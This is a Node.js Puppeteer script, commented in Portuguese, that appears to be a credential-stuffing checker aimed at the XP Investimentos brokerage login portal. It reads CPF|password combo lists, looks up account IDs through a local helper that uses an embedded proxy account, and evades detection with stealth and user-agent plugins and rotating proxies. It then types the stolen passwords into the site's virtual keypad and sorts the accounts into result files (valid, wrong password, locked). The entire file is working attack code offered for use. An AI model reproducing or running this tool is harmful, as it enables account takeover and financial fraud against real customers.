import EventEmitter from 'events';
EventEmitter.defaultMaxListeners = 80;
import readline from 'readline';
import readlineSync from 'readline-sync';
import { promisify } from 'util';
import async from 'async';
import request from 'request';
import fs from 'fs';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import AdblockerPlugin from "puppeteer-extra-plugin-adblocker";
import { DEFAULT_INTERCEPT_RESOLUTION_PRIORITY } from 'puppeteer'
import anonymizeUA from 'puppeteer-extra-plugin-anonymize-ua';
import chalk from 'chalk';

puppeteer.use(StealthPlugin())
.use(
  AdblockerPlugin({
    // Optionally enable Cooperative Mode for several request interceptors
	  blockTrackers: true, // default: false
    interceptResolutionPriority: DEFAULT_INTERCEPT_RESOLUTION_PRIORITY
  })
)
.use(anonymizeUA())


function randomBetween(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function __curl($options) {
   $options.rejectUnauthorized = false;
    return new Promise((resolve, reject) => {
        request($options, (err, res, body) => {
          if( err || !res  || !res.body){
            __curl($options).then(obj=>{
                resolve(obj)
            })
            return;
          }
            resolve({ err: err, res: res, body: body })
        })
    })
}

async function detectxp(linha, randomProxy){
	
		 const dividirlinha = linha.split('|');
		 let cpf = dividirlinha[0]
		 let senha = dividirlinha[1]
	
	 const consultar_cpf = await __curl({
          method: 'GET',
          url: 'http://localhost/detectxp.php?proxyget=pr.lunaproxy.com:12233|user-lu7851999-region-br:pphh2512&cpf=' + cpf,
          headers: {
            'content-type': 'application/json;charset=utf-8',
            'connection': 'Keep-Alive'
          },
          body: ``
        });
	console.log(consultar_cpf.body)
		if(consultar_cpf.body.indexOf('"Rico"') >= 0){
			 let idusr2 = consultar_cpf.body.split('"codClient":')[1].split(',"')[0].trim();
			return 'rico|'+idusr2
		}
        else if (consultar_cpf.body.indexOf('CADASTRO_OK') >= 0) {
			 let idusr = consultar_cpf.body.split('"codClient":')[1].split(',"')[0].trim();
			 return 'ok|'+idusr
		}
		else if (consultar_cpf.body.indexOf('LeadStart') >= 0) {
			return 'leadstart'
		}
		else{
			return 'null'
		}
	
}

 async function linhachecker(linha, randomProxy){
		
		 const dividirlinha = linha.split('|');
		 let iduser = dividirlinha[0]
		 let senha = dividirlinha[1]
		 
		 
		 
		 
	  const browser = await puppeteer.launch(
	  
           {
			    
			   headless: false,
			   product: 'chrome',
			  executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
			  ignoreHTTPSErrors: true,
			 args: [
			  "--no-sandbox",
			  '--proxy-server=' + randomProxy,
					  
					 
				]
            
            }
        );
	  
	  var [page] = await browser.pages();	
					
	await page.setRequestInterception(true);
			
			 const rejectRequestPattern = [
				"googlesyndication.com",
				"google-analytics.com",
				"/*.doubleclick.net",
				"/*.amazon-adsystem.com",
				"/*.adnxs.com",
				"econnect-images.epayworldwide.com",
				"imgs.via.com.br",
				"easy-live-rails-production.s3.us-east-2.amazonaws.com",
				"visit-prod-us.occa.ocs.oraclecloud.com",
				"fonts.googleapis.com",
				"analytics.google.com",
				"s2.adform.net",
				"track.adform.net",
				"facebook.com",
				"/*.facebook.com",
				"/*.linkedin.com",
				"/*.bing.com",
				"/*.twitter.com",
				"/*.segment.com",
				"/*.kampyle.com",
				"facebook.net",
				"/*.facebook.net",
				"res.cloudinary.com",
				"buyapowa-fonts.s3.eu-west-1.amazonaws.com",
				"static.gmlinteractive.com/sportsbookv3/assets",
				"static.gmlinteractive.com/myaccount/css",
				"static.gmlinteractive.com/myaccount/images",
				"static.gmlinteractive.com/myaccount/web/fonts",
				"static.gmlinteractive.com/myaccount/web/img",
				"assets.gmlinteractive.com",
				"br.betano.com/cdn-cgi/images",
				"google.com.br/ads/ga-audiences",
				"cov.gmlinteractive.com",
				"a.mgid.com",
				"googletagmanager.com",
				"/*.gstatic.com",
				"/*.elev.io",
				"/*.t.co",
				"/*.dnofd.com",
				"/*.go-mpulse.net",
				"t.co",
				"/*.eum-appdynamics.com",
				"google.com.br",
				"visuals.kaizengaming.com",
				"mpsnare.iesnare.com",
				'cdn.appdynamics.com',
				'pdx-col.eum-appdynamics.com',
				"clarity.ms",
				"cdn.xpi.com.br/soma/soma-fonts",
				"cdn.xpi.com.br/soma/soma-icons",
				"portal.xpi.com.br/xpi/images",
				"portal.xpi.com.br/xpi/cs",
				"portal.xpi.com.br/content/fonts",
				"static.xpi.com.br/cs",
				"static.xpi.com.br/css",
				"customerattendance.xpi.com.br/widgetelevio/assets/css",
			];
			const blockList = [];

			//if the page makes a  request to a resource type of image then abort that request
			page.on('request', request => {
			if (rejectRequestPattern.find((pattern) => request.url().match(pattern))) {
				blockList.push(request.url());
				request.abort();
				}
			else
				request.continue();
			});
  
		try{
      await page.goto('https://portal.xpi.com.br/default.aspx' , {timeout:30000, waitUntil: 'networkidle2' });
		}catch(error){
			 console.log(chalk.bgRed.black(`ERRO DE CONEXAO -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/connection_error.txt', `ERRO DE CONEXAO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'wait-error'
		}
	 // await page.waitForSelector('#buyapowaEmbed');

	  await page.type('input[name="txtLogin"]', iduser , {delay: 150});
	  await page.waitForTimeout(2000)
	  await page.click('input[id="btnOkLogin"]');
	  
	  	 try{
			  	  await page.waitForNavigation({waitUntil: 'networkidle2' })
		} catch(error){
			 console.log(chalk.bgRed.black(`ERRO AO AGUARDAR CARREGAMENTO DE INSERIR SENHA -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/wait_pass_error.txt', `ERRO AO AGUARDAR CARREGAMENTO DE INSERIR SENHA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'wait-error'
		}

 //await page.waitForSelector('a[id="btnPass4"]', {waitUntil: 'networkidle2'})	
  
 

async function verificarElementoOuTexto(page, browser) {
  let contador = 0;

  while (contador < 5) {

    const elemento = await page.$('a[id="btnPass4"]');
    const texto = await page.$x(`//*[contains(text(), 'Você excedeu o número máximo de tentativas de acesso.')]`);
    const texto2 = await page.$x(`//*[contains(text(), 'Data de nascimento:')]`);

    try {
      if (texto2.length > 0) {
		  return 'nascimento'
        //
      } else if (texto.length > 0) {
		return 'conta-bloqueada'
      } else if (elemento) {
		  return 'found1'
        //
      } 	  else {
       // console.log('Nenhum dos dois encontrados.');
      }
    } catch (e) {
      console.error(`Erro: ${e.message}. Tentando novamente em 1 segundo...`);
      await new Promise((resolve) => setTimeout(resolve, 1000));
      continue;
    }

    contador++;
    await new Promise((resolve) => setTimeout(resolve, 2000));
  }

  //await browser.close();

  if (contador >= 5) {
		return 'unknown1'
  }
}
  var verificar1 = await verificarElementoOuTexto(page, browser)
  
  if(verificar1.includes('unknown1')){
		console.log(chalk.bgRed.black(`ERRO DESCONHECIDO -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/UNKNOWN1.txt', `ERRO DESCONHECIDO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'unknown1'
  }
  else if(verificar1.includes('conta-bloqueada')){
	    console.log(chalk.bgRed.black(`CONTA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/account_bloqued.txt', `CONTA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'conta-bloqueada'
  } else if(verificar1.includes('nascimento')){
	    console.log(chalk.bgRed.black(`PEDIU NASCIMENTO -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/pediu_nascimento.txt', `PEDIU NASCIMENTO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'nascimento'
  }
  
await page.waitForTimeout(12000)
	     for (let i = 0; i < senha.length; i++) {
    const numero = senha[i];

    // Encontre o botão com o número desejado
   const btnSelector = await page.evaluateHandle((numero) => {
  const buttons = Array.from(document.querySelectorAll('.boxRandomPassword .DV_bgNumber'));
  const button = buttons.find(btn => btn.textContent.includes(numero));
  if (!button) {
    throw new Error(`Botão com o número ${numero} não encontrado`);
  }
  return button.parentNode;
}, numero);

    // Clique no botão encontrado
    await btnSelector.click();
  }
  
await page.waitForTimeout(4000)	  
	
		
		try{
			await page.click('input[id="btnEntrar"]');
			  	  await page.waitForNavigation({waitUntil: 'networkidle2' })
		} catch(error){
			 console.log(chalk.bgRed.black(`ERRO AO AGUARDAR CARREGAMENTO DE LOGIN -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/wait_error.txt', `ERRO AO AGUARDAR CARREGAMENTO DE LOGIN -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'wait-error'
		}

		async function verificarElementoOuTexto2(page, browser) {
  let contador = 0;

  while (contador < 6) {

    const elemento = await page.$('a[id="btnPass4"]');
    const texto = await page.$x(`//*[contains(text(), 'A senha digitada está errada')]`);
    const texto2 = await page.$x(`//*[contains(text(), 'Você excedeu o n')]`);

    try {
     // if (elemento) {
	//	  return 'found1'
     //   //
     // } else 
		 if (texto.length > 0) {
		return 'senha-incorreta'
      } 
	else if (texto2.length > 0) {
		return 'senha-bloqueada'
      } else {
       // console.log('Nenhum dos dois encontrados.');
      }
    } catch (e) {
      console.error(`Erro: ${e.message}. Tentando novamente em 1 segundo...`);
      await new Promise((resolve) => setTimeout(resolve, 1000));
      continue;
    }

    contador++;
    await new Promise((resolve) => setTimeout(resolve, 3000));
  }

  //await browser.close();

  if (contador >= 6) {
		return 'unknown2'
  }
}
  var verificar2 = await verificarElementoOuTexto2(page, browser)
  
  if(verificar2.includes('senha-incorreta')){
		console.log(chalk.bgRed.black(`SENHA INCORRETA -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/senha-incorreta.txt', `SENHA INCORRETA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'senha-incorreta'
  }
  else if(verificar2.includes('senha-bloqueada')){
		console.log(chalk.bgRed.black(`SENHA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/senha-bloqueada.txt', `SENHA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'senha-bloqueada'
  }
  else if(verificar2.includes('unknown2')){
	    console.log(chalk.bgRed.black(`UNKNOWN LOGIN ERROR -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/unknown_login.txt', `UNKNOWN LOGIN ERROR -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		await browser.close()
		return 'unknown2'
  }
		 
		 

	 return
    }
	
	//A senha digitada está errada, você tem mais 2 tentativas antes de sua conta ser bloqueada.

	
	
// FUNÇÃO DE TESTAR.
// função que executa as funções assíncronas em paralelo
async function runAsyncFunctions(lines, concurrency, diretorioproxy) {

  const running = [];

  for (let i = 0; i < lines.length; i++) {
    // aguarda até que haja espaço disponível para executar mais uma função
    while (running.length >= concurrency) {
      await Promise.race(running);
      running.splice(running.findIndex((p) => p === null), 1);
    }

    // executa a função assíncrona
    
	   const p1 = async function() {
      console.log(`Starting line ${i + 1}`);
	  console.log(`${lines[i]}`)
      await iniciar(`${lines[i]}`, diretorioproxy)
    }();
	
	    

    running.push(p1);
  }

  // aguarda a conclusão de todas as funções restantes
  while (running.length > 0) {
     const settled = await Promise.allSettled(running);
    running.splice(0, settled.length);
  }
}

// lê o arquivo de texto linha por linha e chama a função de execução das funções assíncronas
async function testar(diretorio, thread, diretorioproxy) {
  const data = fs.readFileSync(diretorio, 'utf-8');
  const dataProxy = fs.readFileSync(diretorioproxy, 'utf-8');
  const lines = data.split('\n').map((line) => line.trim()).filter((line) => line.length > 0);

  const batchSize = thread;
  const batches = [];
  for (let i = 0; i < lines.length; i += batchSize) {
    batches.push(lines.slice(i, i + batchSize));
  }

  for (const batch of batches) {
    const promises = batch.map((line) => iniciar(line, dataProxy));
    await Promise.all(promises);
  }
}

async function iniciar(line, diretorioproxy){
	  return new Promise(async (resolve) => {
    const linesp = diretorioproxy.split('\n');
    const randomIndex = Math.floor(Math.random() * linesp.length);
    const randomProxy = linesp[randomIndex];
	const dividirlinha = line.split('|');
		 let cpf = dividirlinha[0]
		 let senha = dividirlinha[1]
	
	const detectar = await detectxp(line, randomProxy)
	 if(detectar.includes('leadstart')){

		 console.log(chalk.bgGreen.white(`NAO POSSUI CADASTRO -> ID: ${cpf} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/nao_possui_conta.txt', `NAO POSSUI CADASTRO -> ID: ${cpf} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		return 'rico'
	 } 
	 else if(detectar.includes('rico')){
		 const dividirlinha3 = detectar.split('|');
		 let iduser = dividirlinha3[1]
	    console.log(chalk.bgRed.black(`RICO -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/detect_rico.txt', `RICO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		return 'nao-possui'
	 }
	else if(detectar.includes('null')){
	    console.log(chalk.bgRed.black(`ERRO DESCONHECIDO DETECT -> ID: ${cpf} - SENHA: ${senha} `));
		fs.appendFile('./Resultados/detect_error.txt', `ERRO DESCONHECIDO DETECT -> ID: ${cpf} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		return 'detect-error'
	}
	else if(detectar.includes('ok')){
		 const dividirlinha2 = detectar.split('|');
		 let iduser = dividirlinha2[1]
		 let linhatransformada = iduser + '|' + senha
		 console.log(chalk.bgGreen.white(`DETECT -> ID: ${iduser} - SENHA: ${senha}`));
		fs.appendFile('./Resultados/detect.txt', `DETECT -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
	     await linhachecker(linhatransformada, randomProxy);
		resolve();
	}
		else {
	    console.log(chalk.bgRed.black(`ERRO DESCONHECIDO FUNCTION DETECT -> ID: ${cpf} - SENHA: ${senha} `));
		fs.appendFile('./Resultados/detect_function_error.txt', `ERRO DESCONHECIDO FUNCTION DETECT -> ID: ${cpf} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
		return 'detect-function-error'
	}
  
	
	
   
  });
}

	  const rl = readline.createInterface({ input: process.stdin, output: process.stdout});	

function limparInterface() {
  readline.cursorTo(process.stdout, 0, 0); // Move o cursor para a posição (0,0)
  readline.clearScreenDown(process.stdout); // Limpa a tela abaixo do cursor
}

		//PERGUNTAR DIRETORIO DA LISTA
	   let diretoriolista;
	   let threads;

async function abrir1(diretorioproxy){
fs.readdir('./', (err, files) => {
  if (err) throw err;

       console.log(chalk.bgHex('#000292').italic('Arquivos disponíveis: ') + chalk.bgWhite.black.italic('\n - Selecione um numero para escolher sua lista!'));
       files.forEach((file, i) => console.log(chalk.bgHex('#E4FF00').black(`[${i + 1}]`) +  chalk.bgHex('#E4FF00').black(` ${file}`)));
       rl.question('Escolha um arquivo para abrir: ', (index) => {
       limparInterface();
       const selectedFile = files[index - 1];
    if (!selectedFile) {
        console.log('Arquivo não encontrado!');
        rl.close();
        return;
				}
	
        console.log(chalk.bgHex('#FF6400').black.italic(`Lista de Proxys Selecionada: ` + chalk.bgWhite.black(` ${diretorioproxy}:`)));
        console.log(chalk.bgHex('#FF6400').black.italic(`Lista Selecionada: ` + chalk.bgWhite.black(` ${selectedFile}:`)));
	 
        rl.question('Quantidade de Execucoes ao mesmo tempo: ', (res2) => {	
fs.readFile(selectedFile, 'utf8', (err, data) => {
     if (err) throw err;
		limparInterface();
		let diretoriolistar = selectedFile;
		let diretoriolistaproxyr = diretorioproxy;
		let threads = res2;
		let novaString = diretoriolistar.replace(/"/g, "");
		let novaString2 = diretoriolistaproxyr.replace(/"/g, "");
		let diretoriolista = novaString.replace(/\\/g, '/');
		let diretoriolistaproxy = novaString2.replace(/\\/g, '/');
		
	    console.log(chalk.bgHex('#FF6400').black.italic(`Lista de Proxys Selecionada: ` + chalk.bgWhite.black(` ${diretorioproxy}:`)));
	    console.log(chalk.bgHex('#FF6400').black.italic(`Lista Selecionada: ` + chalk.bgWhite.black(` ${selectedFile}:`)));
	    console.log(chalk.bgHex('#FF0000').black.italic(`Threads: ` + chalk.bgWhite.black(` ${threads}:`)));
		 testar(diretoriolista, threads, diretoriolistaproxy)
  .then(() => console.log('Done!'))
  .catch((error) => console.error(error));

        rl.close();
    });
  });
  });
});
}


function abrir2(){
	     limparInterface();
fs.readdir('./', (err, files) => {
  if (err) throw err;
	
        console.log(chalk.bgHex('#000292').italic('Arquivos disponíveis: ') + chalk.bgWhite.black.italic('\n - Selecione um numero para escolher sua lista de proxys!'));
        files.forEach((file, i) => console.log(chalk.bgHex('#E4FF00').black(`[${i + 1}]`) +  chalk.bgHex('#E4FF00').black(` ${file}`)));
		rl.question('Escolha um arquivo para abrir: ', (res3) => {

		const selectedFile = files[res3 - 1];
  if (!selectedFile) {
		console.log('Arquivo não encontrado!');
		rl.close();
		return;
				}

    fs.readFile(selectedFile, 'utf8', (err, data) => {
      if (err) throw err;
		readline.clearScreenDown(process.stdout);
		limparInterface();
		console.log(chalk.bgHex('#FF6400').black.italic(`Lista de Proxys Selecionada: ` + chalk.bgWhite.black(` ${selectedFile}:`)));
		let listaproxy = selectedFile;
		abrir1(listaproxy)

      
    });
  });
  });
};

		abrir2()



